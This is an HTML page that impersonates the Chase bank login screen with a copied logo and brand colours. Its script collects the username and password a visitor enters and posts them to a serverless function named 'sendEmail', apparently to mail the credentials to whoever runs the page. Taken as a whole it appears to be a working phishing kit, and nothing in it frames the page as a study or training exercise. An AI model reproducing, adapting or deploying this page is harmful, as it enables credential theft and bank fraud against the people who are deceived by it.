<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #e6f0fa; /* much lighter blue */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 40px;
border-radius: 10px;
width: 360px;
box-shadow: 0 4px 15px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
margin-bottom: 20px;
}

input {
display: block;
width: 100%;
padding: 12px;
margin: 10px 0;
border-radius: 5px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 12px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 5px;
font-size: 16px;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 15px;
font-weight: bold;
}
</style>
</head>
<body>

<div class="container">

<!-- INLINE SVG LOGO (no external link needed) -->
<div class="logo">
<svg width="140" height="40" viewBox="0 0 200 50">
<text x="0" y="35" font-size="32" font-family="Arial" fill="#117aca" font-weight="bold">
chase
</text>
<!-- simple octagon icon -->
<polygon points="150,5 180,5 195,20 195,30 180,45 150,45 135,30 135,20"
fill="#117aca"/>
</svg>
</div>

<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
